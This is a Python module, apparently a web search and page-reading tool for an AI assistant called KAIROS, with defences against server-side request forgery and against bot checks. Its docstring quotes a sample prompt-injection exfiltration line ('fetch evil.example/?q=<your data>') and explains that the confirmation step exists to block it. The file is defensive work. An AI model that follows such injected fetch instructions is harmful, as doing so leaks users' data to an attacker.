"""Read-only web access: search the web and read pages, with a real browser when available.

Backends (KAIROS_WEB = auto | playwright | http | off):
  playwright - drives a real browser via Playwright: your installed Chrome (KAIROS_WEB_CHANNEL=chrome, the
               default) or Playwright's bundled Chromium. JavaScript runs, so modern sites render. A fresh, empty
               browser profile is used - never your everyday Chrome profile with its logins.
               KAIROS_WEB_HEADLESS=0 shows the window (nice for demos).
  http       - plain HTTP (httpx) + HTML-to-text. No JavaScript, but no extra installs.
  auto       - playwright if it's installed and launches, otherwise http.

Search engine (KAIROS_WEB_ENGINE): duckduckgo (default; its HTML results page tolerates automation) or bing.
No API key needed. If the engine answers with a CAPTCHA / "unusual traffic" page, we stop and say so - we never
try to get around bot checks.

Safety (enforced in code, not left to the model):
  - http(s) only; hosts that resolve to private / loopback / link-local / reserved addresses are refused
    (checked on every redirect hop and on every browser navigation), so a page can't make KAIROS probe your LAN;
  - size + time limits; non-HTML responses (PDFs, binaries) are not read (use download instead);
  - read-only: no form filling, clicks or logins; downloads disabled in the browser;
  - everything returned is *external* content: it taints the turn (kairos/trust.py), and reading a URL that
    isn't already known (search result, link in a message, browser history, user's own words) needs
    confirmation - that blocks "now fetch evil.example/?q=<your data>" exfiltration.
"""

from __future__ import annotations

import base64
import ipaddress
import logging
import queue
import re
import socket
import threading
import time
from concurrent.futures import Future
from dataclasses import dataclass, field
from html import unescape
from html.parser import HTMLParser
from typing import TYPE_CHECKING, Callable
from urllib.parse import parse_qs, quote_plus, unquote, urljoin, urlparse

import httpx

from kairos.net import ssl_context

if TYPE_CHECKING:
    from kairos.config import Settings

log = logging.getLogger(__name__)

USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/124.0 Safari/537.36 KAIROS/0.1")
MAX_BYTES = 3_000_000
MAX_REDIRECTS = 5
MAX_URL_LEN = 2048
BLOCKED_MARKERS = ("unusual traffic", "captcha", "are you a robot", "are you a human", "verify you are human",
                   "anomaly-modal", "please complete the security check", "detected unusual activity")
SKIP_TAGS = {"script", "style", "noscript", "svg", "nav", "footer", "header", "aside", "form", "iframe",
             "template", "button", "select"}
BLOCK_TAGS = {"p", "div", "li", "h1", "h2", "h3", "h4", "h5", "h6", "br", "tr", "section", "article", "main",
              "blockquote", "pre", "dd", "dt", "td", "th", "figcaption"}
STOP = {"the", "a", "an", "of", "and", "or", "to", "in", "on", "for", "is", "are", "what", "how", "why", "who",
        "with", "about", "from", "by", "at", "it", "this", "that", "me", "my"}


class WebError(RuntimeError):
    pass


class UnsafeUrl(WebError):
    pass


class WebBlocked(WebError):
    """The site answered with a bot check (CAPTCHA / unusual traffic)."""


class NotReadable(WebError):
    pass


class WebUnavailable(WebError):
    pass


@dataclass
class SearchResult:
    rank: int
    title: str
    url: str
    snippet: str = ""

    @property
    def domain(self) -> str:
        return urlparse(self.url).netloc.lower().removeprefix("www.")


@dataclass
class Page:
    url: str
    title: str
    text: str
    backend: str
    links: list[str] = field(default_factory=list)

    @property
    def domain(self) -> str:
        return urlparse(self.url).netloc.lower().removeprefix("www.")


# --------------------------------------------------------------------------- URL safety (SSRF guard)
Resolver = Callable[[str], list[str]]


def _resolve(host: str) -> list[str]:
    return sorted({info[4][0] for info in socket.getaddrinfo(host, None)})


def _is_blocked_ip(ip: str) -> bool:
    addr = ipaddress.ip_address(ip.split("%")[0])
    return (addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_multicast or addr.is_reserved
            or addr.is_unspecified or (addr.version == 6 and addr.ipv4_mapped is not None
                                       and _is_blocked_ip(str(addr.ipv4_mapped))))


def check_url(url: str, resolver: Resolver = _resolve) -> str:
    """Raise UnsafeUrl unless `url` is a public http(s) address. Returns the URL."""
    if len(url) > MAX_URL_LEN:
        raise UnsafeUrl("URL too long")
    p = urlparse(url)
    if p.scheme not in ("http", "https"):
        raise UnsafeUrl(f"only http(s) links can be read, not {p.scheme or 'this'}")
    host = (p.hostname or "").strip(".").lower()
    if not host:
        raise UnsafeUrl("no host in URL")
    if host in ("localhost",) or host.endswith((".localhost", ".local", ".internal", ".lan", ".home.arpa")):
        raise UnsafeUrl(f"{host} is a local address")
    try:
        ips = [str(ipaddress.ip_address(host))]
    except ValueError:
        try:
            ips = resolver(host)
        except OSError as exc:
            raise UnsafeUrl(f"can't resolve {host}") from exc
    if not ips:
        raise UnsafeUrl(f"can't resolve {host}")
    for ip in ips:
        if _is_blocked_ip(ip):
            raise UnsafeUrl(f"{host} points to a private/local address")
    return url


def is_private_literal(url: str) -> bool:
    host = urlparse(url).hostname or ""
    if host == "localhost":
        return True
    try:
        return _is_blocked_ip(host)
    except ValueError:
        return False


# --------------------------------------------------------------------------- HTML -> text
class _TextExtractor(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.skip = 0
        self.title = ""
        self._in_title = False
        self.main_depth = 0
        self.parts: list[str] = []
        self.main_parts: list[str] = []
        self.links: list[str] = []
        self._heading = False

    def handle_starttag(self, tag, attrs):
        if tag in SKIP_TAGS:
            self.skip += 1
        elif tag == "title":
            self._in_title = True
        elif tag in ("article", "main"):
            self.main_depth += 1
        if tag == "a":
            href = dict(attrs).get("href")
            if href and href.startswith(("http://", "https://")):
                self.links.append(href)
        if tag in BLOCK_TAGS:
            self._add("\n")
        if tag in ("h1", "h2", "h3") and not self.skip:
            self._heading = True
            self._add("## ")

    def handle_endtag(self, tag):
        if tag in SKIP_TAGS and self.skip:
            self.skip -= 1
        elif tag == "title":
            self._in_title = False
        elif tag in ("article", "main") and self.main_depth:
            self.main_depth -= 1
        if tag in BLOCK_TAGS:
            self._add("\n")

    def handle_data(self, data):
        if self._in_title:
            self.title += data
            return
        if not self.skip:
            self._add(data)

    def _add(self, s: str) -> None:
        self.parts.append(s)
        if self.main_depth:
            self.main_parts.append(s)


def _tidy(parts: list[str]) -> str:
    text = "".join(parts)
    lines = [re.sub(r"[ \t ]+", " ", ln).strip() for ln in text.split("\n")]
    out, blank = [], False
    for ln in lines:
        if not ln or ln == "##":
            blank = bool(out)
            continue
        if blank:
            out.append("")
        out.append(ln)
        blank = False
    return "\n".join(out).strip()


def html_to_text(html: str) -> tuple[str, str, list[str]]:
    """(title, readable text, outbound links). Prefers <article>/<main> when it holds the bulk of the text."""
    ex = _TextExtractor()
    try:
        ex.feed(html)
        ex.close()
    except Exception:  # malformed HTML: keep what we have
        pass
    full, main = _tidy(ex.parts), _tidy(ex.main_parts)
    text = main if len(main) >= 400 else full
    return re.sub(r"\s+", " ", ex.title).strip(), text, list(dict.fromkeys(ex.links))[:50]


def focus_text(text: str, focus: str | None, max_chars: int) -> str:
    """Most relevant paragraphs for `focus` (keyword overlap), kept in page order, within max_chars."""
    if len(text) <= max_chars or not focus:
        return text[:max_chars]
    words = {w for w in re.findall(r"[a-z0-9]+", focus.lower()) if w not in STOP and len(w) > 2}
    paras = [p for p in text.split("\n") if p.strip()]
    if not words:
        return text[:max_chars]
    scored = sorted(range(len(paras)),
                    key=lambda i: -sum(1 for w in words if w in paras[i].lower()))
    keep, size = set(), 0
    for i in [0, *scored]:  # always keep the first paragraph (usually the lead)
        if i in keep:
            continue
        if size + len(paras[i]) > max_chars:
            continue
        keep.add(i)
        size += len(paras[i]) + 1
    return "\n".join(paras[i] for i in sorted(keep))


def looks_blocked(html_or_text: str) -> bool:
    low = html_or_text[:20_000].lower()
    return any(m in low for m in BLOCKED_MARKERS)


# --------------------------------------------------------------------------- search result parsers
def _ddg_target(href: str) -> str | None:
    href = unescape(href)
    if href.startswith("//"):
        href = "https:" + href
    p = urlparse(href)
    if p.netloc.endswith("duckduckgo.com") and p.path.startswith("/l/"):
        target = parse_qs(p.query).get("uddg", [None])[0]
        return unquote(target) if target else None
    if p.netloc.endswith("duckduckgo.com"):  # ads (/y.js) and internal links
        return None
    return href if p.scheme in ("http", "https") else None


class _DdgParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.results: list[dict] = []
        self.mode: str | None = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        cls = a.get("class") or ""
        if tag == "a" and "result__a" in cls:
            target = _ddg_target(a.get("href") or "")
            self.results.append({"url": target, "title": "", "snippet": ""})
            self.mode = "title"
        elif "result__snippet" in cls and self.results:
            self.mode = "snippet"

    def handle_endtag(self, tag):
        if tag in ("a", "div", "td") and self.mode:
            self.mode = None

    def handle_data(self, data):
        if self.mode and self.results:
            self.results[-1][self.mode] += data


class _BingParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.results: list[dict] = []
        self.in_algo = 0
        self.in_h2 = False
        self.mode: str | None = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        cls = a.get("class") or ""
        if tag == "li" and "b_algo" in cls:
            self.in_algo = 1
            self.results.append({"url": None, "title": "", "snippet": ""})
        elif self.in_algo and tag == "h2":
            self.in_h2 = True
        elif self.in_algo and tag == "a" and self.in_h2 and self.results[-1]["url"] is None:
            self.results[-1]["url"] = a.get("href")
            self.mode = "title"
        elif self.in_algo and tag == "p" and not self.results[-1]["snippet"]:
            self.mode = "snippet"

    def handle_endtag(self, tag):
        if tag == "h2":
            self.in_h2 = False
        if tag in ("a", "p"):
            self.mode = None
        if tag == "li" and self.in_algo:
            self.in_algo = 0

    def handle_data(self, data):
        if self.mode and self.results:
            self.results[-1][self.mode] += data


def _unwrap_bing_url(url: str) -> str:
    """Extract destination URL from Bing click-tracking wrapper (ck/a?...&u=a1<base64>)."""
    if "bing.com/ck/a" in url:
        try:
            u = parse_qs(urlparse(url).query).get("u", [None])[0]
            if u and u.startswith("a1"):
                raw = u[2:]
                raw += "=" * (-len(raw) % 4)
                decoded = base64.urlsafe_b64decode(raw).decode("utf-8", errors="ignore")
                if decoded.startswith(("http://", "https://")):
                    return decoded
        except Exception:
            pass
    return url


def parse_results(html: str, engine: str, limit: int = 8) -> list[SearchResult]:
    parser = _BingParser() if engine == "bing" else _DdgParser()
    try:
        parser.feed(html)
    except Exception:
        pass
    out, seen = [], set()
    for r in parser.results:
        raw_url = r.get("url")
        if not raw_url:
            continue
        url = _unwrap_bing_url(raw_url)
        if not url.startswith(("http://", "https://")) or url in seen:
            continue
        seen.add(url)
        out.append(SearchResult(len(out) + 1, re.sub(r"\s+", " ", r["title"]).strip() or url,
                                url, re.sub(r"\s+", " ", r["snippet"]).strip()[:300]))
        if len(out) >= limit:
            break
    return out


def search_url(query: str, engine: str) -> str:
    if engine == "bing":
        return f"https://www.bing.com/search?q={quote_plus(query)}&setlang=en"
    return f"https://html.duckduckgo.com/html/?q={quote_plus(query)}"


# --------------------------------------------------------------------------- backends
class HttpBackend:
    name = "http"

    def __init__(self, timeout_s: float, resolver: Resolver = _resolve, transport: httpx.BaseTransport | None = None):
        self.resolver = resolver
        self.http = httpx.Client(timeout=timeout_s, transport=transport, follow_redirects=False, verify=ssl_context(),
                                 headers={"User-Agent": USER_AGENT, "Accept-Language": "en-US,en;q=0.8"})

    def fetch_html(self, url: str) -> tuple[str, str]:
        for _ in range(MAX_REDIRECTS + 1):
            check_url(url, self.resolver)  # every hop, so a redirect can't land on the LAN
            with self.http.stream("GET", url) as r:
                if r.status_code in (301, 302, 303, 307, 308) and r.headers.get("location"):
                    url = urljoin(url, r.headers["location"])
                    continue
                if r.status_code >= 400:
                    raise WebError(f"{urlparse(url).netloc} answered HTTP {r.status_code}")
                ctype = r.headers.get("content-type", "").lower()
                if ctype and not any(t in ctype for t in ("text/html", "text/plain", "application/xhtml")):
                    raise NotReadable(f"that link is {ctype.split(';')[0]}, not a web page (try downloading it)")
                body = bytearray()
                for chunk in r.iter_bytes():
                    body += chunk
                    if len(body) >= MAX_BYTES:
                        break
                return str(r.url), bytes(body[:MAX_BYTES]).decode(r.encoding or "utf-8", errors="ignore")
        raise WebError("too many redirects")


@dataclass
class _Job:
    url: str
    future: Future


class PlaywrightBackend:
    """One long-lived browser in a dedicated thread (Playwright's sync API is single-threaded)."""

    name = "playwright"
    IDLE_S = 300

    def __init__(self, timeout_s: float, headless: bool, channel: str, resolver: Resolver = _resolve):
        self.timeout_ms = int(timeout_s * 1000)
        self.headless = headless
        self.channel = channel
        self.resolver = resolver
        self.jobs: queue.Queue = queue.Queue()
        self.thread: threading.Thread | None = None
        self.lock = threading.Lock()
        self.launched_with: str | None = None

    @staticmethod
    def installed() -> bool:
        import importlib.util

        return importlib.util.find_spec("playwright") is not None

    def fetch_html(self, url: str) -> tuple[str, str]:
        check_url(url, self.resolver)
        with self.lock:
            if self.thread is None or not self.thread.is_alive():
                self.thread = threading.Thread(target=self._loop, name="kairos-browser", daemon=True)
                self.thread.start()
        job = _Job(url, Future())
        self.jobs.put(job)
        return job.future.result(timeout=self.timeout_ms / 1000 + 30)

    def _launch(self, p):
        if self.channel:
            try:
                self.launched_with = self.channel
                return p.chromium.launch(channel=self.channel, headless=self.headless)
            except Exception as exc:
                log.info("browser channel %s unavailable (%s); trying bundled Chromium", self.channel, exc)
        self.launched_with = "chromium"
        return p.chromium.launch(headless=self.headless)

    def _route(self, route) -> None:
        req = route.request
        try:
            if req.is_navigation_request():
                check_url(req.url, self.resolver)
            elif is_private_literal(req.url):
                route.abort()
                return
            route.continue_()
        except UnsafeUrl:
            route.abort()
        except Exception:
            try:
                route.continue_()
            except Exception:
                pass

    def _loop(self) -> None:
        from playwright.sync_api import sync_playwright

        try:
            with sync_playwright() as p:
                browser = self._launch(p)
                context = browser.new_context(accept_downloads=False, user_agent=USER_AGENT, locale="en-US")
                context.route("**/*", self._route)
                page = context.new_page()
                while True:
                    try:
                        job: _Job = self.jobs.get(timeout=self.IDLE_S)
                    except queue.Empty:
                        break  # idle: close the browser; the next request relaunches it
                    try:
                        page.goto(job.url, wait_until="domcontentloaded", timeout=self.timeout_ms)
                        try:
                            page.wait_for_load_state("networkidle", timeout=3000)
                        except Exception:
                            pass  # busy pages never go idle; what has rendered is enough
                        check_url(page.url, self.resolver)
                        job.future.set_result((page.url, page.content()))
                    except Exception as exc:
                        job.future.set_exception(exc)
                browser.close()
        except Exception as exc:
            log.warning("browser failed: %s", exc)
            while not self.jobs.empty():
                self.jobs.get_nowait().future.set_exception(WebUnavailable(str(exc)))
            raise WebUnavailable(str(exc)) from exc


# --------------------------------------------------------------------------- service
class WebService:
    def __init__(self, settings: Settings, resolver: Resolver = _resolve,
                 transport: httpx.BaseTransport | None = None):
        self.s = settings
        self.mode = settings.web_mode
        self.engine = settings.web_engine if settings.web_engine in ("duckduckgo", "bing") else "duckduckgo"
        self.http = HttpBackend(settings.web_timeout_s, resolver, transport)
        self.browser = PlaywrightBackend(settings.web_timeout_s, settings.web_headless, settings.web_channel, resolver)
        self._browser_broken = False
        self._last_search = 0.0

    @property
    def enabled(self) -> bool:
        return self.mode != "off"

    def _use_browser(self) -> bool:
        if self.mode == "http" or self._browser_broken:
            return False
        return self.mode == "playwright" or PlaywrightBackend.installed()

    def status(self) -> dict:
        backend = "off" if not self.enabled else ("playwright" if self._use_browser() else "http")
        return {"mode": self.mode, "backend": backend, "engine": self.engine,
                "headless": self.s.web_headless, "channel": self.s.web_channel or "bundled chromium",
                "playwright_installed": PlaywrightBackend.installed()}

    def _fetch(self, url: str) -> tuple[str, str, str]:
        if not self.enabled:
            raise WebUnavailable("web access is off (KAIROS_WEB=off)")
        if self._use_browser():
            try:
                final, html = self.browser.fetch_html(url)
                return final, html, "playwright"
            except (UnsafeUrl, WebBlocked, NotReadable):
                raise
            except Exception as exc:
                if self.mode == "playwright":
                    raise WebUnavailable(f"browser failed: {exc}") from exc
                log.info("browser unavailable (%s); using plain HTTP", exc)
                self._browser_broken = isinstance(exc, (WebUnavailable, ImportError))
        final, html = self.http.fetch_html(url)
        return final, html, "http"

    def search(self, query: str, limit: int = 5) -> list[SearchResult]:
        wait = 2.0 - (time.time() - self._last_search)  # be polite: at most one search every 2 s
        if wait > 0:
            time.sleep(wait)
        self._last_search = time.time()
        _final, html, _backend = self._fetch(search_url(query, self.engine))
        results = parse_results(html, self.engine, limit)
        if not results and looks_blocked(html):
            raise WebBlocked(f"{self.engine} is showing a bot check right now; try again later or switch "
                             f"KAIROS_WEB_ENGINE")
        return results

    def read(self, url: str) -> Page:
        final, html, backend = self._fetch(url)
        title, text, links = html_to_text(html)
        if len(text) < 200 and looks_blocked(html):
            raise WebBlocked(f"{urlparse(final).netloc} is showing a bot check")
        if not text.strip():
            raise NotReadable("that page has no readable text")
        return Page(final, title or final, text, backend, links)
